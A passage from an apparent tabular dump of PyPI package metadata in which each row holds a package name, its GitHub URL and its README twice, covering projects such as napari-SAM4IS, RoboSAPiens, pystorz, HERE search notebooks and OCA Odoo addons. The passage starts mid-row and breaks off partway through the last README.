pip install git+https://github.com/vhaasteren/fastshermanmorrison.git
```

From Pypi, you can do

```bash
pip install fastshermanmorrison-pulsar
```

To install via `conda`, simply do

```bash
conda install -c conda-forge fastshermanmorrison-pulsar
```

","# FastShermanMorrison

![PyPI](https://img.shields.io/pypi/v/fastshermanmorrison-pulsar)
![Conda (channel only)](https://img.shields.io/conda/vn/conda-forge/fastshermanmorrison-pulsar)


Cython code to more quickly evaluate ShermanMorrison combinations as need by
kernel ecorr in Enterprise.

# Installation

The FastShermanMorrison add-on to Enterprise can be easily installed straight
from github using

```bash
pip install git+https://github.com/vhaasteren/fastshermanmorrison.git
```

From Pypi, you can do

```bash
pip install fastshermanmorrison-pulsar
```

To install via `conda`, simply do

```bash
conda install -c conda-forge fastshermanmorrison-pulsar
```

",vhaasteren/fastshermanmorrison
napari-sam4is,https://github.com/hiroalchem/napari-SAM4IS,12,2700,2457,"# napari-SAM4IS

[![License Apache Software License 2.0](https://img.shields.io/pypi/l/napari-SAM4IS.svg?color=green)](https://github.com/hiroalchem/napari-SAM4IS/raw/main/LICENSE)
[![PyPI](https://img.shields.io/pypi/v/napari-SAM4IS.svg?color=green)](https://pypi.org/project/napari-SAM4IS)
[![Python Version](https://img.shields.io/pypi/pyversions/napari-SAM4IS.svg?color=green)](https://python.org)
[![tests](https://github.com/hiroalchem/napari-SAM4IS/workflows/tests/badge.svg)](https://github.com/hiroalchem/napari-SAM4IS/actions)
[![codecov](https://codecov.io/gh/hiroalchem/napari-SAM4IS/branch/main/graph/badge.svg)](https://codecov.io/gh/hiroalchem/napari-SAM4IS)
[![napari hub](https://img.shields.io/endpoint?url=https://api.napari-hub.org/shields/napari-SAM4IS)](https://napari-hub.org/plugins/napari-SAM4IS)

Create annotations for instance segmentation using Segment Anything models

----------------------------------

This [napari] plugin was generated with [Cookiecutter] using [@napari]'s [cookiecutter-napari-plugin] template.

<!--
Don't miss the full getting started guide to set up your new package:
https://github.com/napari/cookiecutter-napari-plugin#getting-started

and review the napari docs for plugin developers:
https://napari.org/stable/plugins/index.html
-->

## Installation

You can install `napari-SAM4IS` via [pip]:

    pip install napari-SAM4IS



To install latest development version :

    pip install git+https://github.com/hiroalchem/napari-SAM4IS.git


## Contributing

Contributions are very welcome. Tests can be run with [tox], please ensure
the coverage at least stays the same before you submit a pull request.

## License

Distributed under the terms of the [Apache Software License 2.0] license,
""napari-SAM4IS"" is free and open source software

## Issues

If you encounter any problems, please [file an issue] along with a detailed description.

[napari]: https://github.com/napari/napari
[Cookiecutter]: https://github.com/audreyr/cookiecutter
[@napari]: https://github.com/napari
[MIT]: http://opensource.org/licenses/MIT
[BSD-3]: http://opensource.org/licenses/BSD-3-Clause
[GNU GPL v3.0]: http://www.gnu.org/licenses/gpl-3.0.txt
[GNU LGPL v3.0]: http://www.gnu.org/licenses/lgpl-3.0.txt
[Apache Software License 2.0]: http://www.apache.org/licenses/LICENSE-2.0
[Mozilla Public License 2.0]: https://www.mozilla.org/media/MPL/2.0/index.txt
[cookiecutter-napari-plugin]: https://github.com/napari/cookiecutter-napari-plugin

[file an issue]: https://github.com/hiroalchem/napari-SAM4IS/issues

[napari]: https://github.com/napari/napari
[tox]: https://tox.readthedocs.io/en/latest/
[pip]: https://pypi.org/project/pip/
[PyPI]: https://pypi.org/
","# napari-SAM4IS

[![License Apache Software License 2.0](https://img.shields.io/pypi/l/napari-SAM4IS.svg?color=green)](https://github.com/hiroalchem/napari-SAM4IS/raw/main/LICENSE)
[![PyPI](https://img.shields.io/pypi/v/napari-SAM4IS.svg?color=green)](https://pypi.org/project/napari-SAM4IS)
[![Python Version](https://img.shields.io/pypi/pyversions/napari-SAM4IS.svg?color=green)](https://python.org)
[![tests](https://github.com/hiroalchem/napari-SAM4IS/workflows/tests/badge.svg)](https://github.com/hiroalchem/napari-SAM4IS/actions)
[![codecov](https://codecov.io/gh/hiroalchem/napari-SAM4IS/branch/main/graph/badge.svg)](https://codecov.io/gh/hiroalchem/napari-SAM4IS)
[![napari hub](https://img.shields.io/endpoint?url=https://api.napari-hub.org/shields/napari-SAM4IS)](https://napari-hub.org/plugins/napari-SAM4IS)

Create annotations for instance segmentation using Segment Anything models

----------------------------------

This [napari] plugin was generated with [Cookiecutter] using [@napari]'s [cookiecutter-napari-plugin] template.



## Installation

You can install `napari-SAM4IS` via [pip]:

    pip install napari-SAM4IS



To install latest development version :

    pip install git+https://github.com/hiroalchem/napari-SAM4IS.git


## Contributing

Contributions are very welcome. Tests can be run with [tox], please ensure
the coverage at least stays the same before you submit a pull request.

## License

Distributed under the terms of the [Apache Software License 2.0] license,
""napari-SAM4IS"" is free and open source software

## Issues

If you encounter any problems, please [file an issue] along with a detailed description.

[napari]: https://github.com/napari/napari
[Cookiecutter]: https://github.com/audreyr/cookiecutter
[@napari]: https://github.com/napari
[MIT]: http://opensource.org/licenses/MIT
[BSD-3]: http://opensource.org/licenses/BSD-3-Clause
[GNU GPL v3.0]: http://www.gnu.org/licenses/gpl-3.0.txt
[GNU LGPL v3.0]: http://www.gnu.org/licenses/lgpl-3.0.txt
[Apache Software License 2.0]: http://www.apache.org/licenses/LICENSE-2.0
[Mozilla Public License 2.0]: https://www.mozilla.org/media/MPL/2.0/index.txt
[cookiecutter-napari-plugin]: https://github.com/napari/cookiecutter-napari-plugin

[file an issue]: https://github.com/hiroalchem/napari-SAM4IS/issues

[napari]: https://github.com/napari/napari
[tox]: https://tox.readthedocs.io/en/latest/
[pip]: https://pypi.org/project/pip/
[PyPI]: https://pypi.org/
",hiroalchem/napari-sam4is
robotframework-robosapiens,https://github.com/imbus/robotframework-robosapiens,1,1030,1030,"# RoboSAPiens: SAP GUI Automation for Humans

Fully localized Robot Framework library for automating the SAP GUI using text locators.

Available localizations:

- English
- German

## Requirements

- [.NET Runtime 7.0 x86](https://dotnet.microsoft.com/en-us/download/dotnet/7.0)
- Scripting must be [enabled in the Application Server](https://help.sap.com/saphelp_aii710/helpdata/en/ba/b8710932b8c64a9e8acf5b6f65e740/content.htm?no_cache=true)
- Scripting must be [enabled in the SAP GUI client](https://help.sap.com/docs/sap_gui_for_windows/63bd20104af84112973ad59590645513/7ddb7c9c4a4c43219a65eee4ca8db001.html?version=760.01&locale=en-US)

## Installation

```bash
pip install robotframework-robosapiens
```

1. Download the zip file with the .NET Runtime binaries
2. Extract the `dotnet` directory from the zip file
3. Set the environment variable `DOTNET_ROOT(x86)` to the path of the `dotnet` directory

## Usage

Consult the [Documentation](https://imbus.github.io/robotframework-robosapiens/).
","# RoboSAPiens: SAP GUI Automation for Humans

Fully localized Robot Framework library for automating the SAP GUI using text locators.

Available localizations:

- English
- German

## Requirements

- [.NET Runtime 7.0 x86](https://dotnet.microsoft.com/en-us/download/dotnet/7.0)
- Scripting must be [enabled in the Application Server](https://help.sap.com/saphelp_aii710/helpdata/en/ba/b8710932b8c64a9e8acf5b6f65e740/content.htm?no_cache=true)
- Scripting must be [enabled in the SAP GUI client](https://help.sap.com/docs/sap_gui_for_windows/63bd20104af84112973ad59590645513/7ddb7c9c4a4c43219a65eee4ca8db001.html?version=760.01&locale=en-US)

## Installation

```bash
pip install robotframework-robosapiens
```

1. Download the zip file with the .NET Runtime binaries
2. Extract the `dotnet` directory from the zip file
3. Set the environment variable `DOTNET_ROOT(x86)` to the path of the `dotnet` directory

## Usage

Consult the [Documentation](https://imbus.github.io/robotframework-robosapiens/).
",imbus/robotframework-robosapiens
pystorz,https://github.com/wazofski/pystorz,0,2558,2490,"<p align=""center"">
<img src=""logo.png"" width=""300"" alt=""storz"" />
</p>

**pystorz** is an *object store framework* built in python. It consists of a set of modules implementing the [Store](https://github.com/wazofski/pystorz/tree/master/pystorz/store) interface and features a simple [object modeling language](https://github.com/wazofski/pystorz/tree/master/pystorz/mgen) used to generate golang object class meta for interacting with `Store` APIs.

**pystorz** modules provide functionality to store, modify and retrieve modeled objects from various sources (TBD). Such modules can be composed together to chain `Store` functionality into more complex logical modules. Combining modules allows handling object changes and manipulating data in complex ways *within or across* services, making multi-level server complexity achievable with ease. The Store modules are fully compatible with each other and can be composed in any combination since they all implement or expose the same [Store](https://github.com/wazofski/pystorz/tree/master/pystorz/store) interface.

Original storz was written in go. You can check it out here:
[https://github.com/wazofski/gostorz](https://github.com/wazofski/gostorz)

This is a python port of the original storz.
Still in development.

## Quick Start Guide

### Installation
```
pip install pystorz
```

## Model example

You can find a saomple model in the tests folder.
[https://github.com/wazofski/pystorz/blob/master/tests/model/sample.yml](https://github.com/wazofski/pystorz/blob/master/tests/model/sample.yml)

You can define simple structures and reference them as fields in other structures.

You need to define Objects that will become your root level modeled objects. You can then create, update, delete and retrieve these from using a store.

Only a SQLite store is implemented at the moment.

More to come.
Check out the go version (link above) for more information.

## Usage
```
    from pystorz.mgen import builder

    # run the code gen to 
    builder.Generate(""path/to/model.yml"")
    # this will make a generated folder in the project home directory

    # you can then import the generated model
    from generated import model

    # initialize a store
    stor = SqliteStore(
        Schema(),
        SqliteConnection(""path/to/your/sqlite3.db""))

    world = model.WorldFactory()
    world.External().SetName(""hello"")

    created_world = stor.Create(world)
    world.External().SetDescription(""hello world"")
    updated_world = stor.Update(world.Metadata().Identity(), world)
    
    # ...

```
","



**pystorz** is an *object store framework* built in python. It consists of a set of modules implementing the [Store](https://github.com/wazofski/pystorz/tree/master/pystorz/store) interface and features a simple [object modeling language](https://github.com/wazofski/pystorz/tree/master/pystorz/mgen) used to generate golang object class meta for interacting with `Store` APIs.

**pystorz** modules provide functionality to store, modify and retrieve modeled objects from various sources (TBD). Such modules can be composed together to chain `Store` functionality into more complex logical modules. Combining modules allows handling object changes and manipulating data in complex ways *within or across* services, making multi-level server complexity achievable with ease. The Store modules are fully compatible with each other and can be composed in any combination since they all implement or expose the same [Store](https://github.com/wazofski/pystorz/tree/master/pystorz/store) interface.

Original storz was written in go. You can check it out here:
[https://github.com/wazofski/gostorz](https://github.com/wazofski/gostorz)

This is a python port of the original storz.
Still in development.

## Quick Start Guide

### Installation
```
pip install pystorz
```

## Model example

You can find a saomple model in the tests folder.
[https://github.com/wazofski/pystorz/blob/master/tests/model/sample.yml](https://github.com/wazofski/pystorz/blob/master/tests/model/sample.yml)

You can define simple structures and reference them as fields in other structures.

You need to define Objects that will become your root level modeled objects. You can then create, update, delete and retrieve these from using a store.

Only a SQLite store is implemented at the moment.

More to come.
Check out the go version (link above) for more information.

## Usage
```
    from pystorz.mgen import builder

    # run the code gen to 
    builder.Generate(""path/to/model.yml"")
    # this will make a generated folder in the project home directory

    # you can then import the generated model
    from generated import model

    # initialize a store
    stor = SqliteStore(
        Schema(),
        SqliteConnection(""path/to/your/sqlite3.db""))

    world = model.WorldFactory()
    world.External().SetName(""hello"")

    created_world = stor.Create(world)
    world.External().SetDescription(""hello world"")
    updated_world = stor.Update(world.Metadata().Identity(), world)
    
    # ...

```
",wazofski/pystorz
here-search-demo,https://github.com/heremaps/here-search-demo,20,1845,1845,"[![Python package](https://github.com/heremaps/here-search-demo/actions/workflows/test.yml/badge.svg)](https://github.com/heremaps/here-search-demo/actions/workflows/test.yml)
[![codecov](https://codecov.io/gh/heremaps/here-search-demo/branch/main/graph/badge.svg?token=MVFCS4BUFN)](https://codecov.io/gh/heremaps/here-search-demo)

# HERE Search notebooks

A set of jupyter notebooks demonstrating the use of [HERE Geocoding & Search][4] endpoints `/autosuggest`,  `/discover`, `/browse`, and `/lookup`.

![searching for restaurants](https://github.com/heremaps/here-search-demo/raw/main/docs/screenshot.png)

Requirements: a [HERE API key][1] and a Python environment.

The notebooks can be [used in your browser][3] without further installation.

## Installation

If you need to install the notebooks or the underlying library on your workstation, run preferably in a virtual environment:

   ```
   pip install here-search-demo
   ```

Link the virtual environment to a IPython kernel:

   ```
   python -m ipykernel install \
     --prefix $(python -c ""import sys; print(sys.prefix)"") \
     --name search_demo --display-name ""search demo""
   ```


Use the `here-search-notebooks` script with your HERE API Key:

   ```
   API_KEY=""your API key"" here-search-notebooks
   ```
   
(More [details][2])

## License

Copyright (C) 2022-2023 HERE Europe B.V.

This project is licensed under the MIT license - see the [LICENSE](./LICENSE) file in the root of this project for license details.

[1]: https://developer.here.com/documentation/geocoding-search-api/dev_guide/topics/quick-start.html#get-an-api-key
[2]: https://github.com/heremaps/here-search-demo/blob/main/docs/developers.md
[3]: https://heremaps.github.io/here-search-demo/lab/?path=demo.ipynb
[4]: https://developer.here.com/documentation/geocoding-search-api/dev_guide/index.html
","[![Python package](https://github.com/heremaps/here-search-demo/actions/workflows/test.yml/badge.svg)](https://github.com/heremaps/here-search-demo/actions/workflows/test.yml)
[![codecov](https://codecov.io/gh/heremaps/here-search-demo/branch/main/graph/badge.svg?token=MVFCS4BUFN)](https://codecov.io/gh/heremaps/here-search-demo)

# HERE Search notebooks

A set of jupyter notebooks demonstrating the use of [HERE Geocoding & Search][4] endpoints `/autosuggest`,  `/discover`, `/browse`, and `/lookup`.

![searching for restaurants](https://github.com/heremaps/here-search-demo/raw/main/docs/screenshot.png)

Requirements: a [HERE API key][1] and a Python environment.

The notebooks can be [used in your browser][3] without further installation.

## Installation

If you need to install the notebooks or the underlying library on your workstation, run preferably in a virtual environment:

   ```
   pip install here-search-demo
   ```

Link the virtual environment to a IPython kernel:

   ```
   python -m ipykernel install \
     --prefix $(python -c ""import sys; print(sys.prefix)"") \
     --name search_demo --display-name ""search demo""
   ```


Use the `here-search-notebooks` script with your HERE API Key:

   ```
   API_KEY=""your API key"" here-search-notebooks
   ```
   
(More [details][2])

## License

Copyright (C) 2022-2023 HERE Europe B.V.

This project is licensed under the MIT license - see the [LICENSE](./LICENSE) file in the root of this project for license details.

[1]: https://developer.here.com/documentation/geocoding-search-api/dev_guide/topics/quick-start.html#get-an-api-key
[2]: https://github.com/heremaps/here-search-demo/blob/main/docs/developers.md
[3]: https://heremaps.github.io/here-search-demo/lab/?path=demo.ipynb
[4]: https://developer.here.com/documentation/geocoding-search-api/dev_guide/index.html
",heremaps/here-search-demo
xrmap,https://github.com/javiergvaldecasas/xarray-map,3,44,44,"Plot xarrays lat-lon datasets using folium

","Plot xarrays lat-lon datasets using folium

",javiergvaldecasas/xarray-map
azure-keyvault-stuff,https://github.com/george-oconnor/azure-keyvault-stuff,0,699,699,"# Azure Keyvault Stuff

A package that provides functionality for interacting with an Azure Keyvault

## Installation

Run the following to install the package:

``python -m pip install azure-keyring-stuff``

## Usage

```python
from azure_keyring_stuff import getClient, getSecret, setSecret, deleteSecret
from azure.identity import DefaultAzureCredential

client = getClient(vault_name=""VAULT_NAME"", credential=DefaultAzureCredential())

secret = getSecret(client=client, secret_name=""SECRET_NAME"")

new_secret = setSecret(client=client, secret_name=""SECRET_NAME"", secret_value=""SECRET_VALUE"")

deleted_secret = deleteSecret(client=client, secret_name=""SECRET_NAME"")

```
","# Azure Keyvault Stuff

A package that provides functionality for interacting with an Azure Keyvault

## Installation

Run the following to install the package:

``python -m pip install azure-keyring-stuff``

## Usage

```python
from azure_keyring_stuff import getClient, getSecret, setSecret, deleteSecret
from azure.identity import DefaultAzureCredential

client = getClient(vault_name=""VAULT_NAME"", credential=DefaultAzureCredential())

secret = getSecret(client=client, secret_name=""SECRET_NAME"")

new_secret = setSecret(client=client, secret_name=""SECRET_NAME"", secret_value=""SECRET_VALUE"")

deleted_secret = deleteSecret(client=client, secret_name=""SECRET_NAME"")

```
",george-oconnor/azure-keyvault-stuff
adversary-armor,https://github.com/haim-fisher-s/Adversary-Armor,0,379,379,"Hack-Blocker
============

A repository that provides innovative solution to armor against adversarial attacks.

Version
-------
v0.1.1


Changelog
=========

v0.1.1 (2023-04-25)
------------------------------------------------------------

* project launch
* added tox, lint, ci, cd etc.

v0.1.0 (2023.04.25)
-------------------

* First release on PyPI.
","Hack-Blocker
============

A repository that provides innovative solution to armor against adversarial attacks.

Version
-------
v0.1.1


Changelog
=========

v0.1.1 (2023-04-25)
------------------------------------------------------------

* project launch
* added tox, lint, ci, cd etc.

v0.1.0 (2023.04.25)
-------------------

* First release on PyPI.
",haim-fisher-s/adversary-armor
ethconnect,https://github.com/Zymbit-Wallet/ETH-Connect-PY,0,612,612,"# ETH-Connect Python SDK

## Overview

Ethereum accounts, signatures, and transactions have an additional layer of complexity over traditional cryptographic keys and signatures. [Zymbit](https://www.zymbit.com/)'s ETH-Connect SDK aims to abstract away this complexity, enabling you to seamlessly integrate with Ethereum and EVM compatible chains without having to deal with their technical intricacies.

**NOTE:** Only compatible with [HSM6](https://www.zymbit.com/hsm6/), [SCM](https://www.zymbit.com/scm/), and [SEN](https://www.zymbit.com/secure-compute-node/)

## Installation

```
pip install ethconnect
```","# ETH-Connect Python SDK

## Overview

Ethereum accounts, signatures, and transactions have an additional layer of complexity over traditional cryptographic keys and signatures. [Zymbit](https://www.zymbit.com/)'s ETH-Connect SDK aims to abstract away this complexity, enabling you to seamlessly integrate with Ethereum and EVM compatible chains without having to deal with their technical intricacies.

**NOTE:** Only compatible with [HSM6](https://www.zymbit.com/hsm6/), [SCM](https://www.zymbit.com/scm/), and [SEN](https://www.zymbit.com/secure-compute-node/)

## Installation

```
pip install ethconnect
```",zymbit-wallet/eth-connect-py
odoo-addon-coupon-multiplier-free-product,https://github.com/OCA/sale-promotion,2,4235,3820,"==============================
Coupon Multiplier Free Product
==============================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fsale--promotion-lightgray.png?logo=github
    :target: https://github.com/OCA/sale-promotion/tree/15.0/coupon_multiplier_free_product
    :alt: OCA/sale-promotion
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/sale-promotion-15-0/sale-promotion-15-0-coupon_multiplier_free_product
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/296/15.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

Base module that sets the configurations to create
promotions of the type 3x2 or take this product and get
this one another that apply as many times as the promotion rules fulfill.

**Table of contents**

.. contents::
   :local:

Configuration
=============

If you want to create a promotion program of the type 3x2:

  #. Go to *Sales > Products > Promotion programs* and create a new one.
  #. Set the reward type to *Multiple of*.
  #. Set the *Free product* to the one in the promotion.
  #. Set the *Force rewarded product* option.
  #. Set the *Quantity* to reward.
  #. Set the *Quantity* to fulfill the reward condition.
  #. If you want a limit on how many times the product should be rewarded, set a
     *Maximum reward quantity*.

If you want to create a promotion program of the type take one of these products and
get this one another for free:

  #. Go to *Sales > Products > Promotion programs* and create a new one.
  #. Set the reward type to *Multiple of*.
  #. Set the *Free product* to the one in the promotion.
  #. Set the *Quantity* to reward.
  #. Set the *Quantity* to fulfill the reward condition.
  #. Set the products domain to fulfill the reward condition.
  #. If you want a limit on how many times the product should be rewarded, set a
     *Maximum reward quantity*.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/sale-promotion/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/sale-promotion/issues/new?body=module:%20coupon_multiplier_free_product%0Aversion:%2015.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Tecnativa

Contributors
~~~~~~~~~~~~

* `Tecnativa <https://www.tecnativa.com>`_:

  * David Vidal
  * Stefan Ungureanu

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-chienandalu| image:: https://github.com/chienandalu.png?size=40px
    :target: https://github.com/chienandalu
    :alt: chienandalu

Current `maintainer <https://odoo-community.org/page/maintainer-role>`__:

|maintainer-chienandalu| 

This module is part of the `OCA/sale-promotion <https://github.com/OCA/sale-promotion/tree/15.0/coupon_multiplier_free_product>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","==============================
Coupon Multiplier Free Product
==============================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fsale--promotion-lightgray.png?logo=github
    :target: https://github.com/OCA/sale-promotion/tree/15.0/coupon_multiplier_free_product
    :alt: OCA/sale-promotion
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/sale-promotion-15-0/sale-promotion-15-0-coupon_multiplier_free_product
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/296/15.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

Base module that sets the configurations to create
promotions of the type 3x2 or take this product and get
this one another that apply as many times as the promotion rules fulfill.

**Table of contents**

.. contents::
   :local:

Configuration
=============

If you want to create a promotion program of the type 3x2:

  #. Go to *Sales > Products > Promotion programs* and create a new one.
  #. Set the reward type to *Multiple of*.
  #. Set the *Free product* to the one in the promotion.
  #. Set the *Force rewarded product* option.
  #. Set the *Quantity* to reward.
  #. Set the *Quantity* to fulfill the reward condition.
  #. If you want a limit on how many times the product should be rewarded, set a
     *Maximum reward quantity*.

If you want to create a promotion program of the type take one of these products and
get this one another for free:

  #. Go to *Sales > Products > Promotion programs* and create a new one.
  #. Set the reward type to *Multiple of*.
  #. Set the *Free product* to the one in the promotion.
  #. Set the *Quantity* to reward.
  #. Set the *Quantity* to fulfill the reward condition.
  #. Set the products domain to fulfill the reward condition.
  #. If you want a limit on how many times the product should be rewarded, set a
     *Maximum reward quantity*.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Tecnativa

Contributors
~~~~~~~~~~~~

* `Tecnativa `_:

  * David Vidal
  * Stefan Ungureanu

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-chienandalu| image:: https://github.com/chienandalu.png?size=40px
    :target: https://github.com/chienandalu
    :alt: chienandalu

Current `maintainer `__:

|maintainer-chienandalu| 

This module is part of the `OCA/sale-promotion `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/sale-promotion
rizzless-guitar-guide,https://github.com/captainrizzless/musical-practice-stuff,0,1410,1410,"# Rizzless Guitar Guide

This is the first version of the program and the first Python project I created
that motivated me to create this repo. I'm sure there's probably other repos out
there with better and more bountiful information better suited to comb through, 
however, I wanted to create my own to get more familiar with developing in GitHub, 
as well as get more comfortable with Python while studying and creating a tool I 
could use with one hand standing up when practicing guitar (all my fellow guitar 
players out there knows how annoying it can be to have to take off a guitar and 
put it somewhere secure, whether it be a stand or propped up on a bed with a 
pillow rolled up just under the headstock just so you know there isn't any 
unnecessary tension on the neck, all just to be able to move freely when trying 
to navigate through whatever studio setup you got going on). I wanted a personalized 
program/tool that I could use for either the creative process of creating music, or
to use when I'm practicing guitar and need to quickly find something I couldn't 
quite fully recall. This may or may not be a super convoluted excuse I made 
to justify my need for creating something as simple this when other resources exist 
(depends on your way of thinking I suppose). Either way, I hope this first version 
of the program helps to cover any basic music theory questions related to guitar.
","# Rizzless Guitar Guide

This is the first version of the program and the first Python project I created
that motivated me to create this repo. I'm sure there's probably other repos out
there with better and more bountiful information better suited to comb through, 
however, I wanted to create my own to get more familiar with developing in GitHub, 
as well as get more comfortable with Python while studying and creating a tool I 
could use with one hand standing up when practicing guitar (all my fellow guitar 
players out there knows how annoying it can be to have to take off a guitar and 
put it somewhere secure, whether it be a stand or propped up on a bed with a 
pillow rolled up just under the headstock just so you know there isn't any 
unnecessary tension on the neck, all just to be able to move freely when trying 
to navigate through whatever studio setup you got going on). I wanted a personalized 
program/tool that I could use for either the creative process of creating music, or
to use when I'm practicing guitar and need to quickly find something I couldn't 
quite fully recall. This may or may not be a super convoluted excuse I made 
to justify my need for creating something as simple this when other resources exist 
(depends on your way of thinking I suppose). Either way, I hope this first version 
of the program helps to cover any basic music theory questions related to guitar.
",captainrizzless/musical-practice-stuff
odoo-addon-purchase-stock-tier-validation,https://github.com/OCA/purchase-workflow,2,3328,2904,"==============================
Purchase Stock Tier Validation
==============================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fpurchase--workflow-lightgray.png?logo=github
    :target: https://github.com/OCA/purchase-workflow/tree/15.0/purchase_stock_tier_validation
    :alt: OCA/purchase-workflow
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/purchase-workflow-15-0/purchase-workflow-15-0-purchase_stock_tier_validation
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/142/15.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module excludes RFQs pending to validate or validated when procuring a product.

If a RFQ, at some point, is requested to validate, it converts it immediately in something unmodifiable.
Then, taking this into account, if we procure a product with the same supplier as one open RFQ, it should
check if that is under validation or already validated and discard it on any of both cases.

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/purchase-workflow/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/purchase-workflow/issues/new?body=module:%20purchase_stock_tier_validation%0Aversion:%2015.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* ForgeFlow

Contributors
~~~~~~~~~~~~

* Bernat Puig Font <bernat.puig@forgeflow.com>

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-bosd| image:: https://github.com/bosd.png?size=40px
    :target: https://github.com/bosd
    :alt: bosd

Current `maintainer <https://odoo-community.org/page/maintainer-role>`__:

|maintainer-bosd| 

This module is part of the `OCA/purchase-workflow <https://github.com/OCA/purchase-workflow/tree/15.0/purchase_stock_tier_validation>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","==============================
Purchase Stock Tier Validation
==============================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fpurchase--workflow-lightgray.png?logo=github
    :target: https://github.com/OCA/purchase-workflow/tree/15.0/purchase_stock_tier_validation
    :alt: OCA/purchase-workflow
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/purchase-workflow-15-0/purchase-workflow-15-0-purchase_stock_tier_validation
